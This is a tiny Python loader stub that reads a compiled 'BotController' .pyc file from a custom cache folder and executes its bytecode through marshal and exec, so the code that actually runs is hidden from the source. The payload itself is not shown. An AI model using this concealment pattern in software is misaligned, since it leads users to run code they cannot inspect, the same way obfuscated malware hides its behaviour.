
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'BotController_3e480723e26141f2a1deef1f7492075d.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
